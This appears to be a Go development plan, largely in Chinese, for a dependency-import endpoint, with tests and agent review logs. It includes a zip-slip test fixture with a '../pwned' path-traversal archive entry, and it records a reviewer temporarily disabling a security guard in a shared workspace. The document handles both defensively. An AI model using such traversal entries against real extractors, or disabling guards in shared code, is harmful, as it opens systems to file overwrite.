- [ ] **Step 1: 写失败测试**

**新建 `internal/controller/deps_import_test.go`**（不是"追加"——该文件尚不存在；`postJSON` 与
`setupTestServer` 都在同包的 `handler_test.go` 里，直接用，不要重定义）：

```go
package controller

import (
	"net/http"
	"testing"
)

func TestImportDepsRejectsEmptyResourceURL(t *testing.T) {
	_, server := setupTestServer(t)

	resp := postJSON(t, server.URL+"/v1/taa/importDeps", map[string]any{
		"resourceUrl": "",
		"requestId":   "req-1",
	})
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusBadRequest {
		t.Fatalf("status = %d, want 400", resp.StatusCode)
	}
}

func TestImportDepsRejectsMissingTaskAndRequestID(t *testing.T) {
	_, server := setupTestServer(t)

	resp := postJSON(t, server.URL+"/v1/taa/importDeps", map[string]any{
		"resourceUrl": "http://127.0.0.1:1/deps.tar.gz",
	})
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusBadRequest {
		t.Fatalf("status = %d, want 400", resp.StatusCode)
	}
}

func TestImportDepsRejectsNonPost(t *testing.T) {
	_, server := setupTestServer(t)

	resp, err := http.Get(server.URL + "/v1/taa/importDeps")
	if err != nil {
		t.Fatalf("GET: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusMethodNotAllowed {
		t.Fatalf("status = %d, want 405", resp.StatusCode)
	}
}
```

**已核实的既有辅助函数**（都在同包 `internal/controller/handler_test.go`）：`postJSON(t, url,
body)` 在 `:146`；`setupTestServer(t)` 在 `:105`，其内部走 `RegisterRoutes(mux, state)` —— 所以
只要 Step 4 把路由注册进 `router.go`，这三个测试就会打到真实路由，不需要任何额外接线。

- [ ] **Step 2: 运行测试确认失败**

```bash
go test ./internal/controller/ -run TestImportDeps -v
```

期望：三个用例**全部 FAIL**——前两个 `status = 404, want 400`，第三个 `status = 404, want 405`。

> **订正（2026-10-08，Task 5 实现期发现）**：此处初稿写"第三个 200 而非 405"，**预测值是错的**。
> 路由表只注册显式路径（`mux.HandleFunc(route.path, ...)`），全仓无 `/` catch-all，因此未注册路径在
> `http.ServeMux` 下对**任何方法**都只返回 404——"200" 在机制上不可达。这不影响该用例的判别力
> （它断言的是 405，注册前失败、注册后通过），但照初稿执行的人会以为测错了。

- [ ] **Step 3: 实现请求体与 handler**

创建 `internal/controller/deps_import.go`：

```go
package controller

import (
	"encoding/json"
	"fmt"
	"net/http"
	"strings"

	pkgerrors "taa/pkg/errors"
)

// depsImportRequest is the request body for /v1/taa/importDeps.
// It deliberately does not reuse importRequest: that type's publicKey and runtimeConfig mean
// nothing for a dependency archive, and accepting them would only create the ambiguity of
// fields that are accepted but silently ignored.
type depsImportRequest struct {
	ResourceURL string `json:"resourceUrl"`
	RequestID   string `json:"requestId"`
	TaskID      string `json:"taskId"`
}

// ── Handler: /v1/taa/importDeps ──────────────────────────

func (s *TAAState) depsImportHandler(w http.ResponseWriter, r *http.Request) {
	var req depsImportRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeErr(w, http.StatusBadRequest, pkgerrors.Wrap(pkgerrors.CodeInvalidArgument, fmt.Sprintf("请求解析失败: %v", err), err))
		return
	}
	req.ResourceURL = strings.TrimSpace(req.ResourceURL)
	req.RequestID = strings.TrimSpace(req.RequestID)
	req.TaskID = strings.TrimSpace(req.TaskID)

	// resourceUrl is mandatory: dependencies are content-addressed, and letting an empty value
	// mean "reuse the current set" would make it impossible to infer which dependency set is
	// actually in effect.
	if req.ResourceURL == "" {
		writeErr(w, http.StatusBadRequest, pkgerrors.New(pkgerrors.CodeInvalidArgument, "resourceUrl 不能为空"))
		return
	}
	if req.RequestID == "" && req.TaskID == "" {
		writeErr(w, http.StatusBadRequest, pkgerrors.New(pkgerrors.CodeInvalidArgument, "requestId 和 taskId 不能同时为空"))
		return
	}

	release, err := s.tryAcquireTaskTyped(req.TaskID, req.RequestID, "deps_importing", "deps_import")
	if err != nil {
		s.Logs.Add(LogWarn, "importDeps", "拒绝并发的依赖导入请求: %v", err)
		writeErr(w, http.StatusConflict, err)
		return
	}

	s.mu.RLock()
	phase := s.CurrentPhase
	s.mu.RUnlock()

	s.Logs.Add(LogInfo, "importDeps", "收到依赖包 import 请求: taskId=%s, requestId=%s, phase=%d",
		req.TaskID, req.RequestID, phase)

	s.Logs.Add(LogInfo, "importDeps", "开始下载依赖包: %s", req.ResourceURL)
	ciphertextPath, size, err := s.downloadToTempFile(req.ResourceURL)
	if err != nil {
		release()
		s.Logs.Add(LogError, "importDeps", "下载依赖包失败: %v", err)
		writeErr(w, http.StatusInternalServerError, err)
		return
	}
	s.Logs.Add(LogInfo, "importDeps", "依赖包下载完成 (%d bytes) -> %s", size, ciphertextPath)

	writeEnvelope(w, http.StatusOK, "依赖包已接收，处理中", nil, 0)

	s.runAsyncSafe("processImportedDeps", release, func() {
		s.processImportedDeps(req, phase, ciphertextPath)
	})
}
```

`processImportedDeps` 在 Task 6 实现完整流水线。本步骤先落下**可编译、可运行、行为正确但功能最小**
的版本——它只负责删除临时密文与把 `currentOp` 复位，本任务的三条测试（参数校验与 405）全部只需要
走到 `tryAcquireTaskTyped` 与下载之前，因此不依赖流水线内容。Task 6 Step 4 会用完整实现替换整个函数体：

```go
// processImportedDeps is a minimal stand-in for the full dependency pipeline that Task 6 adds.
// It only has to remove the temporary ciphertext: by the time it runs the handler has already
// written its response, and releasing the task restores currentOp (runAsyncSafe does
// `defer release()`, verified at route.go:740-745), so an explicit op reset here would be
// redundant.
func (s *TAAState) processImportedDeps(req depsImportRequest, phase int, ciphertextPath string) {
	defer os.Remove(ciphertextPath)
}
```

`deps_import.go` 的 import 块需含 `"os"`。

**⚠️ spec §4.1 有一处事实性错误，本任务按 `importModel` 的真实行为实现（已核实）。**
spec 原文写"响应体在下载**之前**就已写出（与 `importModel` 的下载分支同构）"——把方向说反了。
`modelImportHandler`（`handler_task.go:263-295`）的真实顺序是：

```
tryAcquireTask → downloadToTempFile（失败即 release() + 500）→ writeEnvelope(200) → runAsyncSafe
```

即**下载本身是同步的**，下载失败确实会返回 5xx；只有**下载之后**的解包与内容校验才发生在 200
已写出之后，因而无法再返回 4xx。本任务照此实现（下载失败返回 500），与 `importModel` 逐字同构。

spec 的那句话已同步订正。结论（内容校验只能异步）不变，但理由必须说对：若照 spec 原文理解，
会得出"下载失败也走 `reportDeps`"的错误时序模型，进而把同步错误处理写成异步上报。

- [ ] **Step 4: 注册路由**

`internal/controller/router.go` 的路由表（`:13-21`）中，`importModel` 之后新增一行：

```go
		{"/v1/taa/importDeps", state.depsImportHandler},
```

- [ ] **Step 5: 运行测试确认通过**

```bash
go test ./internal/controller/ -run TestImportDeps -v
```

期望：三个用例全部 PASS（400 / 400 / 405）。

- [ ] **Step 6: 提交**

```bash
git add internal/controller/deps_import.go internal/controller/router.go internal/controller/deps_import_test.go
git commit -m "feat(deps): add importDeps handler and route"
```

---

### Task 5 闭环记录（2026-10-08，复审 APPROVE）

**Task 5 已结**。实现 `f98837c`，修复 `3c4a9b9`（仅 `deps_import.go` 三行注释 + `deps_import_test.go`
新增 70 行）。复审为**独立复核**，未采信实现者结论：

| 变异 | 复审者自行复现的结果 |
| :--- | :--- |
| 删失败分支 `release()`（`deps_import.go:63`） | **FAIL** `deps_import_test.go:89`，2.01s |
| 删 `s.runAsyncSafe(...)`（`:72-74`） | **FAIL** `deps_import_test.go:116`，2.01s |
| 改消息串（`:70`） | **FAIL** `deps_import_test.go:111` |

三条 Minor 全部解决：1(a)/1(b) 经上述变异证明有判别力；抖动陷阱规避到位（`waitForDepsSlotRelease`
只轮询两个状态字段，且下载临时文件落在 `os.TempDir()` 而非 `t.TempDir()`，结构上不可能触发
`concurrency_test.go` 那类 `TempDir RemoveAll: directory not empty`）；Minor 3 的新措辞经核实**为真**
（全 `internal/` 下 `grep DisallowUnknownFields` 为空，故旧理由"被接受却静默忽略的字段"确属松垮）。

**驳回一条非阻断 Minor（记录在案，不修）**：复审者用变异 D 证明——把 `tryAcquireTaskTyped` 及其
错误分支换成 `release := func(){}`（槽位永不获取），两个新测试**仍然全绿**。根因是 `NewTAAState`
的默认值本就是 `CurrentOp: "idle"`（`route.go:525`）+ `ActiveTaskID` 零值，恰好等于 helper 的
"已释放"谓词，所以"从未获取"与"获取后释放"不可区分。

**不修的理由**：`tryAcquireTaskTyped` 的**获取**语义已由 Task 3 的单测覆盖（本计划 `:667`/`:675`
两处断言 `task-deps-1`/`task-deps-2` 的获取与冲突）；handler 层**独有**的风险是"每条退出路径都要
释放"，这已被变异 A/B 钉住。补齐获取侧属于镀金——若将来有人删掉 `tryAcquireTaskTyped` 调用，
Task 3 的单测会以编译/断言失败报警，不会静默通过。

---

### Task 6/8 编码前预审发现（已直接改入正文，实现者无需再判断）

在 Task 4 审查期间对 Task 6 的 `processImportedDeps` 做定点审查，发现 4 个缺陷，均已修正：

| # | 级别 | 缺陷 | 修正 |
| :--- | :--- | :--- | :--- |
| A | 功能 | 审计失败路径只经 `runDepsAudit` 发 `reportAudit`（`scope=deps`），**从不发 `reportDeps`** ⇒ 平台侧 `importDeps` 任务永远收不到终态，表现为**挂起**而非失败。Task 6 的桩注释写「Task 8 补全上报」，但 Task 8 的改动范围不含 `auditAndReportDeps`，该上报从未被补上 | 失败分支增加 `s.reportDepsFailure(req, "依赖包审计未通过")`；桩注释改为明确的责任划分 |
| B | 功能 | 失败分支**无条件** `clearDepsState()`，会把**已生效的旧依赖绑定**一并清掉，违反 spec §5「新依赖导入**成功**即覆盖 `DepsHash`」，使 TAA 静默退化为"无依赖"，在下一轮训练里以毫不相干的 `ImportError` 暴露 | 抽出 `rollbackDepsImport`：只删目录，**仅当** `currentDepsDir() == depsDir`（失败者正是当前绑定者）才清位 |
| C | 测试 | `TestDepsAuditFailureRemovesDirAndClearsState` 名字里的 "ClearsState" **无任何断言**；且它测的是 `runDepsAudit`，而清位逻辑在 `processImportedDeps` | 重命名为 `TestRunDepsAuditRemovesDirOnFailure`；新增 `TestRollbackDepsImportKeepsAnUnrelatedBinding` 与 `TestRollbackDepsImportClearsTheBindingItOwns` 为 B 建立覆盖（**这两条后被 (Q) 取代并删除**，场景改由 Task 6 的流水线用例覆盖） |
| D | 磁盘 | `os.MkdirTemp("", ...)` 把可能 GB 级的 wheelhouse 解到根分区（本项目实测根分区约 28G、镜像已占约 25G），会直接 ENOSPC | 父目录改为 `s.Security.GetDepsDir()`，即那个为依赖准备、容量匹配的卷 |

**B 的可达性说明（决定测试怎么写）**：审计路径只在 `.taa_audit_ok` 缺失时才会到达，而绑定的建立
顺序是 `writeAuditMarker` → `saveDepsSuccess`，因此"失败者恰好是当前绑定者"在常规流程下**不可达**；
它只在"人工删掉某个已导入集合的审计标记、同一归档再次下发"时发生。
`TestRollbackDepsImportClearsTheBindingItOwns` 覆盖的正是这条路径，不要因为它"看起来不可能"而删掉。

> **作废（2026-10-08，见下文 Task 8 预审第二轮 (Q)）**：上表 C 行新拟的两条 `TestRollbackDepsImport*`
> 已从 Task 8 删除。Task 6 的流水线用例后来端到端覆盖了同样两个场景（`ae24045`），且各自被变异判死。
> 上面那句"不要删掉"的告诫针对的是**该场景必须有覆盖**，而不是"必须由这两个函数提供覆盖"——
> 覆盖仍在，只是移到了真实调用点上。另：本段下方的"钩子判定失败"一栏也已随 (P) 删除审计钩子而作废，
> 见 (P)。

**职责边界（Task 6 与 Task 8 的实现者共同遵守）**：目录的 fail-closed 删除由 `runDepsAudit` 在
**每一条**返回 `false` 的路径上完成（三条：LLM 不可用、审计执行出错、结论未通过——初稿列的"钩子判定失败"
已随 (P) 删除审计钩子而去掉）；
`rollbackDepsImport` 中的 `os.RemoveAll` 是幂等的二次保险，目的是不让流水线自己的不变式依赖
别处的副作用。**审计报告**走 `reportAuditScopedAsync`（`scope=deps`），**任务终态**走 `reportDeps`
——两者都要发，缺一即平台侧观测不完整。

---

### Task 6 编码前预审·第二轮（2026-10-08，逐符号核对）

对 Step 3/Step 4 用到的每一个外部符号做了实测核对，**结论：全部存在且签名一致，实现者可直接照抄**。

| 符号 | 实测位置 | 与计划是否一致 |
| :--- | :--- | :--- |
| `setCurrentOp(op string)` | `route.go:533` | 一致（仅 `mu.Lock` 后赋值，无副作用） |
| `HashFileSM3(path) (size int64, hex string, err error)` | `pkg/crypto/sm3.go:39` | **返回序一致**（`size, hash, err` 正是此序） |
| `teecrypto "taa/pkg/crypto"` | `attestation_format.go:8` 等 | 别名即仓库惯例 |
| `resource.ValidateWheelhouse(dir string) error` | `internal/resource/deps.go:17` | 一致（**注意它在 `resource` 包，不在 `runtime`**） |
| `resource.ExtractArchiveToDir(dst, filePath string) error` | `internal/resource/archive.go:41` | **参数序一致**（`dst` 在前） |
| `saveDepsSuccess` / `clearDepsState` / `currentDepsDir` / `depsDirForHash` | `internal/controller/deps_state.go:11/23/54/65` | 均已由 Task 2 落地 |
| `runtime.InstallWheelhouse(ctx, wheelhouse, target)` | `internal/runtime/deps.go:37` | **带 ctx**，故 Step 3 的钩子必须包一层 `context.Background()`——Step 3 已如此写 |
| `setupTestState(t) (*TAAState, string)` | `handler_test.go:26` | 一致（`state, _ :=` 正确） |
| 测试用的 deps 根目录 | `handler_test.go:78` 的 `DepsDir: t.TempDir()` | **每个测试一个独立临时目录**，不会写到 `/opt/taa/model-deps` |
| 生产的 deps 根目录创建 | `app.go:631`（`ensureSecurityDirectories` 已含 `sec.GetDepsDir()`） | 已覆盖，`os.MkdirTemp(root, ...)` 的父目录必然存在 |
| `ExtractArchiveToDir` 的失败清理 | `archive.go:48-52`（`defer os.RemoveAll(tmpDir)`） | 失败路径不留残余 ⇒ `assertDepsRootEmpty` 不会假失败 |
| `buildTestArchive` 的确定性 | 计划内 `sort.Strings(names)`（`:1858`）+ 手写 `tar.Header`（无 ModTime/Uid/Gid） | **同一 files 映射两次调用产出同字节**，幂等用例的 hash 才可比 |

**本轮唯一的发现：`deps_installing` 是第二个新的 op 取值，spec §5 未列——已补入 spec。**

Step 4 写了 `s.setCurrentOp("deps_installing")`。实测全仓既有 op 取值集合为
`{analyzing, decrypting, downloading, idle, reporting, staging, training}`，因此依赖导入期间
`status` 会依次报出 `deps_importing`（Task 5 经 `tryAcquireTaskTyped` 的 `initialOp` 写入）
→ `decrypting` → `deps_installing` → `idle`，其中后两个都是计划对 spec 的**增量**。
计划第 75-77 行已把该增量记为"已知遗留"，且理由成立（安装阶段是 GB 级 wheel 的长耗时环节，
运营方需要区分"在下/解密"与"在安装"）——**取值保持不变**。

需要补的不是实现而是 spec：spec §5 原文只列了 `deps_importing` 一个取值，而 phase 2
（platform-mock）与 phase 3（文档）的实现者**只读 spec**，会漏掉 `decrypting` 复用与
`deps_installing`。**已改入 spec §5。**

顺带核实的**安全性结论**（说明该取值不会引入功能缺陷）：现有分支对 op 取值不敏感——四处判定
（`route.go:569`/`:580`/`:657`、`handler_system.go:92`）里只有 `:580` 的 `isTrainingBusyLocked`
枚举了具体值，而 `deps_installing` 不在其中，恰好符合"依赖导入不算训练忙"的预期；
并发保护由 `route.go:657` 的 `CurrentOp != "idle"` 承担，该判定与取值无关。
**若将来有人往 `isTrainingBusyLocked` 的枚举里加值，必须同时判断依赖导入是否应当算忙。**

**另一条给实现者的提醒（不必改计划）**：`depsInstallFunc` 是本包的包级变量，
因此 **`internal/controller` 的测试不得使用 `t.Parallel()`**——两个并行测试会争抢同一个钩子，
一个会跑成另一个的桩。这与 Task 4 给 `internal/runtime` 的 `pipBinary`/`pipWaitDelay` 记的是
同一类陷阱，只是换了包。Task 6 的三个用例本身没有 `t.Parallel()`，保持现状即可。

---

### Task 6 交付期发现（实现者自证，2026-10-08，已直接改入正文）

Task 6 的实现者按计划要求的「变异判别力」自证时，发现有两个用例在**计划规定的变异方式下杀不死**，
经核实**根因在计划给的测试设计本身**，不在实现。两处均已改入正文：

| # | 用例 | 计划原文的缺陷 | 修正 |
| :--- | :--- | :--- | :--- |
| I | `TestProcessImportedDepsRejectsArchiveWithoutWheel` | **没有替换 `depsInstallFunc`**。于是绕过 `ValidateWheelhouse` 后跑的是真 `runtime.InstallWheelhouse`，pip 在 `--no-index` 下无候选必然失败（`exit status 1`），失败分支照样清目录、状态照样为 false ⇒ 该用例有**两个独立的失败原因**，绿是"两个都对"撑出来的：绕过内容校验它照样绿 | 补上 `depsInstallFunc` 的**成功**桩（与同文件其它用例一致），使内容校验成为唯一可能的失败源 |
| J | `TestProcessImportedDepsRejectsZipSlip` | 恶意条目用了 **8 层 `..`**，从 `<depsRoot>/taa-deps-wh-*.extract-*` 上溯后落在 **`/pwned`**，跑出了用例能观测的范围；且非 root 写 `/` 被 EACCES 拒绝，解压**仍**报错 ⇒ 该用例**无法区分「守卫拒绝」与「操作系统拒绝」**，而 §9 把 zip-slip 称为"本方案最关键的一条" | 深度降到 `../pwned`，落回 `<depsRoot>/pwned`——测试自己可写、可观测的位置，`assertDepsRootEmpty` 与 `os.Stat(outside)` **两条断言同时承重** |

**由此得出的一条方法论**（记于此以免后续任务重犯）：**「变体验证」本身也要被验证。**
给安全/校验类用例规定变异时，必须同时确认**该变异确实能把用例判死**——否则"我做了变异验证"
只是一句无法证伪的话。Task 6 的实现者在这里做得对：变异杀不死时**照实报告并给出替代变异**
（它补的 2b 把 `depsInstallFunc` 改成直接成功、4b 把守卫从「拒绝」降级为「净化」，两者都能判死），
而不是换一个更弱的断言把表格填满。

**另一条留给 Task 7/8 的注意**：Task 6 按计划把最小桩写在了 `deps_import.go`
（`reportDepsAsync` 桩、`auditAndReportDeps` 最小版、返回 `true` 的 `runDepsAudit`；行号随 Task 9
的插入略有漂移，**按符号名定位**）。Task 7 Step 5 **替换** `reportDepsAsync`、Task 8 Step 4
**删除** `runDepsAudit`——两处都是替换/删除，**不是新增**，重复定义会直接编译失败。

**zip-slip 守卫的精确位置（勘误，供 Task 8/文档沿用）**：守卫不在 `ExtractArchiveToDir` 里。
`ExtractArchiveToDir`（`internal/resource/archive.go:41-69`）只是"解到兄弟临时目录 → `os.RemoveAll(dst)`
→ `os.Rename`"的包装；真正的越界判定在 **`SafeJoinWithBase`（`archive.go:318`，判定在 `:332-334`）**，
由两条解包路径调用（zip 在 `:209`、tar 在 `:260`），并在 `import_processing.go:953` 被再导出。
本计划前文"防护在 `ExtractArchiveFile` 内完成"的措辞不准确——防护是**经由**它到达的，守卫本身在
`SafeJoinWithBase`。这个区别有实操后果：**要判定 zip-slip 用例的判别力，变异点必须是
`SafeJoinWithBase`，变异 `ExtractArchiveToDir` 打不到它**。另注：`SafeJoinWithBase` 本身已有
直接单测（`internal/resource/archive_test.go:33`，覆盖 `../` 与绝对路径），Task 6 的用例覆盖的是
**流水线对其的使用**，两者不重复。

---

### Task 6 规范审查发现（2026-10-08，已直接改入正文）

**符合性判定：YES。** 审查者独立重跑了全部四个变异（未采信实现者的自证），确认每个都能杀掉对应用例；
并逐条核验了流水线顺序、幂等检查落在解包之前、内容校验位于 200 已写出之后、临时 wheelhouse 落在
依赖卷而非根分区、以及 zip-slip 守卫的归属。判定不是"看着像"，四处都给了行号与运行输出。
以下只记需要动代码的部分。

**(L) fail-open：`runDepsAudit` 桩无条件返回 `true`，且在默认配置下会写出一枚永久骗过 Task 8 的标记。**

事实链（逐项已实测）：

| 位置 | 事实 |
| :--- | :--- |
| `internal/config/config.go:328` | `EnableSecurityScan` 默认 **true** |
| `internal/app/taa/app.go:587` | `ScanEnabled: cfg.EnableSecurityScan`，默认即 true |
| `internal/controller/router.go:17` | `/v1/taa/importDeps` **已挂载**，handler 是活的 |
| `internal/controller/deps_import.go:263` | `runDepsAudit` 桩 `return true`，注释自称"让扫描开启时也通过" |
| `internal/controller/deps_import.go:179` | 审计通过 ⇒ `writeAuditMarker` 落盘 |
| `internal/controller/deps_import.go:122` | 幂等检查只看标记**存在性** ⇒ Task 8 的真审计此后被永久短路 |

即：默认配置下，Task 6 到 Task 8 之间任何一个 `importDeps` 都会**零审计地报 `code=0` 成功**，
并留下一枚让真审计再也跑不起来的标记。这与 §3 决策 5「同引擎、同策略、**fail-closed**」相反，是
fail-**open**。Task 6 自己的测试看不见它：`setupTestState` 用 `ScanEnabled: false`
（`handler_test.go:73`），桩的那条分支从未被执行。

**修法：桩返回 `false`。** fail-closed 的含义就是"无法审计 ⇒ 拒绝"，不是"无法审计 ⇒ 放行"；
改后桩也不再写出任何标记，"永久标记"问题随之消失。Task 8 落地真审计时替换此桩。

**(M) "绑定不先于其目录消失"这条不变量此前只在审计路径上成立。**

`:165`（安装失败）与 `:180`（写标记失败）用的是裸 `_ = os.RemoveAll(depsDir)`，不带
`rollbackDepsImport` 的条件清位。后果：若当前**正在生效**的那套依赖其标记被人工删除后又被重下，
流水线会在 `:159` 删掉**活的**目录，随后若安装或写标记失败，就留下 `DepsImported=true` 而目录已不存在
——训练注入 `TAA_DEPS_DIR` 后以 `ImportError` 失败。这是 §6 订正 2 要防的"静默退化"的**镜像**
（那边是"位留目录走"，这边是"目录走位留"）。修法：这两处同样改调 `s.rollbackDepsImport(depsDir)`，
把不变量统一为**"绑定永远不会比它指向的目录活得更久"**——被删的是绑定者就清位，不是绑定者就不动。

**(N) §12 的两条失败语义在 Task 6 完全没有测试。**

审查者指出"没有任何测试驱动安装失败"，故 `:164-169` 分支零覆盖；`rollbackDepsImport` 的条件清位
在 Task 6 也不可达（桩让审计永不失败）。而 §12 明确要求"闭包缺失时立即失败且不留半成品目录"，
§6 订正 2 更把"失败的后来者不得掀掉在用的那套"列为本方案最强调的失败语义。修 (L) 之后两者**都变得可测**：

- `TestProcessImportedDepsInstallFailureKeepsWorkingBinding`：先成功导入 A（`ScanEnabled=false`），
  再让 `depsInstallFunc` 对 B 返回错误 ⇒ 断言 `DepsImported` 仍为 true、`DepsHash` 仍是 A、
  A 的目录与其标记完好、B 的目录不存在、deps 根下**恰好只剩 A**。
- `TestProcessImportedDepsKeepsBindingWhenNewAuditFails`：先成功导入 A，再置 `ScanEnabled=true`
  导入 B ⇒ 桩返回 false ⇒ 审计失败 ⇒ 断言与上条同形。

两条都断言"**恰好剩下什么**"，而不是"没有报错"——后者在删掉条件清位的变异下依然通过，属无效断言。

**修法本身被实现者纠正过一次，记录在此**：我给的失败安装器桩是裸 `return errors.New("pip exploded")`，
**不创建 target**。这样"删掉安装失败分支的目录删除"这个变异**杀不死** `…KeepsWorkingBinding`——桩没往盘上
落任何东西，就没有可删的目录，`assertDepsRootContainsOnly` 照样成立。实现者拒绝照抄，改为"先
`os.MkdirAll(target)` 再返回错误"，并指出这不是为测试扭曲语义：`runtime.InstallWheelhouse` 的文档注释
逐字写着 "On failure target may be left partially populated. Cleanup belongs to the caller"
（`internal/runtime/deps.go:35-36`），且它在跑 pip 前确实先 `os.MkdirAll(target, 0o755)`（`:54`）。
**已独立复核，实现者是对的**：失败后 target 里有半成品才是真实契约，也正是"清理必须由流水线拥有"
的理由。这是我第二次在测试设计上被实现者驳回（第一次是 I/J），两次都是"桩比现实更干净"导致的假判别力。

**不修、仅记录的一项**：`:159` 的安装前 `os.RemoveAll(depsDir)` 在"标记被人工删除且该目录正是当前绑定者"
时会删掉活目录。修 (M) 已保证此后的失败路径清位、状态不再撒谎，故不再为此增设"安装到临时目录再改名"
的重型改造——那是 §14 之外的新机制，收益与复杂度不成比例。此判断在此明写，避免后续审查重复提出。

---

### 并发编排的一处失误与由此确立的规则（2026-10-08）

**事实**：Task 6 的规范审查者按我的授权去变异 `SafeJoinWithBase`（删除越界判定）以判定 zip-slip
用例的判别力。该变异**发生在另一个 agent 正在同一检出里跑 `go test` 的时候**。两后果均已实测：
Task 9 的实现者观察到了由此产生的瞬时构建失败（`fullAbs` 未使用）；更严重的是，**若审查者在中途
死亡，被禁用的守卫会原样留在工作区**，被后续任何 `git add` 顺手提交——而那正是 §9 称为"本方案
最关键的一条"的防护。事后核验：工作区与 HEAD 逐字节一致（blob `de74157`），且
`git log -S'if false' -- internal/resource/archive.go` 为空，即**从未有提交包含被禁用的守卫**。

**由此确立的规则（剩余任务一律遵守）**：

1. **变异只允许发生在该任务自己拥有的文件里。** 需要变异共享文件（如 `internal/resource/archive.go`、
   `internal/controller/import_processing.go`）来判定判别力时，审查者必须**先报告并申请**，
   由控制方在**没有其它 agent 运行**的窗口里单独授权，且变异的还原要有 blob 哈希级别的证明。
2. **任何两个会执行 `go test` 的 agent 不得并发。** 一个 agent 的变异会让另一个的构建失败，
   后者的"通过/失败"结论因此不可信——比慢更糟的是得出错误的 PASS。
3. 好在剩余任务的文件重叠本就很重（Task 7/8 共用 `deps_import.go`，Task 8/10 共用
   `import_processing.go`），**顺序执行几乎不损失并行度**。自本行起改为一次一个 agent。

---

## Task 6: 依赖流水线（幂等、安装、状态流转、上报）

**Files:**
- Modify: `internal/controller/deps_import.go`（替换 Task 5 的占位）
- Test: `internal/controller/deps_import_test.go`（追加）

- [ ] **Step 1: 写失败测试**

追加到 `internal/controller/deps_import_test.go`：

```go
// TestProcessImportedDepsInstallsAndRecords 用 stub 安装器验证流水线：解密后的明文归档
// 被校验、被"安装"到 DEPS_DIR/<sm3>、状态位置位、审计标记落盘。
//
// Security.ScanEnabled=false 让 auditAndReportDeps 走既有短路直接放行，从而不必替换审计钩子——
// 这与模型导入测试的手法一致。
func TestProcessImportedDepsInstallsAndRecords(t *testing.T) {
	state, _ := setupTestState(t)
	state.Security.ScanEnabled = false

	origInstall := depsInstallFunc
	t.Cleanup(func() { depsInstallFunc = origInstall })

	var installedTarget string
	depsInstallFunc = func(wheelhouse, target string) error {
		installedTarget = target
		return os.MkdirAll(target, 0o755)
	}

	archive := buildTestDepsArchive(t)

	req := depsImportRequest{ResourceURL: "http://x/deps.tar.gz", RequestID: "req-d", TaskID: "task-d"}
	state.processImportedDeps(req, 1, archive)

	if !state.DepsImported {
		t.Fatal("DepsImported = false after a successful pipeline run")
	}
	if installedTarget != state.currentDepsDir() {
		t.Fatalf("install target = %q, want %q", installedTarget, state.currentDepsDir())
	}
	if _, err := os.Stat(filepath.Join(installedTarget, depsAuditMarker)); err != nil {
		t.Fatalf("audit marker missing: %v", err)
	}
}

// TestProcessImportedDepsSkipsWhenAlreadyAudited 验证幂等：同 hash 已带标记时不再调用安装器。
func TestProcessImportedDepsSkipsWhenAlreadyAudited(t *testing.T) {
	state, _ := setupTestState(t)

	origInstall := depsInstallFunc
	t.Cleanup(func() { depsInstallFunc = origInstall })

	calls := 0
	depsInstallFunc = func(wheelhouse, target string) error {
		calls++
		return os.MkdirAll(target, 0o755)
	}

	archive := buildTestDepsArchive(t)
	req := depsImportRequest{ResourceURL: "http://x/deps.tar.gz", RequestID: "req-i", TaskID: "task-i"}

	state.processImportedDeps(req, 1, buildTestDepsArchive(t))
	state.clearDepsState()
	state.processImportedDeps(req, 1, archive)

	if calls != 1 {
		t.Fatalf("installer called %d times, want 1 (second run must reuse the audited dir)", calls)
	}
}

// TestProcessImportedDepsRejectsArchiveWithoutWheel 验证归档内容校验发生在异步流水线内。
//
// The installer is stubbed out to SUCCEED on purpose. Without the stub the real
// runtime.InstallWheelhouse runs, fails on its own (pip has no candidate under --no-index),
// and the test's two assertions would hold for that unrelated reason -- it would pass even
// with ValidateWheelhouse bypassed. Stubbing makes the content check the only thing that can
// fail, which is what the assertions are meant to measure.
func TestProcessImportedDepsRejectsArchiveWithoutWheel(t *testing.T) {
	state, _ := setupTestState(t)

	origInstall := depsInstallFunc
	t.Cleanup(func() { depsInstallFunc = origInstall })
	depsInstallFunc = func(wheelhouse, target string) error { return os.MkdirAll(target, 0o755) }

	archive := buildTestArchive(t, map[string]string{"requirements.txt": "torch\n"})
	req := depsImportRequest{ResourceURL: "http://x/bad.tar.gz", RequestID: "req-b", TaskID: "task-b"}

	state.processImportedDeps(req, 1, archive)

	if state.DepsImported {
		t.Fatal("DepsImported = true for an archive without any .whl")
	}
	assertDepsRootEmpty(t, state)
}

// TestProcessImportedDepsRejectsZipSlip 验证恶意归档的 `../` 条目被拒，且没有写出
// 任何内容到 depsDir 之外。
//
// The traversal depth is deliberately SHALLOW. The extraction base is a direct child of the
// deps root (<depsRoot>/taa-deps-wh-*.extract-*), so "../pwned" resolves to <depsRoot>/pwned
// -- a writable location the test can actually observe, caught by both assertions below.
// A deeper traversal (e.g. eight "..") escapes past the deps root to /pwned, where a
// non-root write fails with EACCES: extraction then errors for an unrelated reason and the
// test can no longer tell the guard rejecting the entry from the OS refusing the write.
func TestProcessImportedDepsRejectsZipSlip(t *testing.T) {
	state, _ := setupTestState(t)
	state.Security.ScanEnabled = false

	origInstall := depsInstallFunc
	t.Cleanup(func() { depsInstallFunc = origInstall })
	depsInstallFunc = func(wheelhouse, target string) error { return os.MkdirAll(target, 0o755) }

	outside := filepath.Join(state.Security.GetDepsDir(), "pwned")
	archive := buildTestArchive(t, map[string]string{
		"requirements.txt":       "torch\n",
		"a-1.0-py3-none-any.whl": "x",
		"../" + filepath.Base(outside): "pwned",
	})

	req := depsImportRequest{ResourceURL: "http://x/evil.tar.gz", RequestID: "req-z", TaskID: "task-z"}
	state.processImportedDeps(req, 1, archive)

	if state.DepsImported {
		t.Fatal("DepsImported = true for an archive with a path-traversal entry")
	}
	if _, err := os.Stat(outside); !os.IsNotExist(err) {
		t.Fatalf("zip-slip escaped the extraction dir: %s exists", outside)
	}
	assertDepsRootEmpty(t, state)
}

// ── 测试辅助 ──────────────────────────────────────────

// buildTestDepsArchive 构造一个最小合法依赖包：requirements.txt + 一个空 .whl。
func buildTestDepsArchive(t *testing.T) string {
	t.Helper()
	return buildTestArchive(t, map[string]string{
		"requirements.txt":       "torchvision==0.28.0\n",
		"torchvision-0.28.0-py3-none-any.whl": "not-a-real-wheel\n",
	})
}

// buildTestArchive 把 name→content 打成 tar.gz 落盘，返回文件路径。
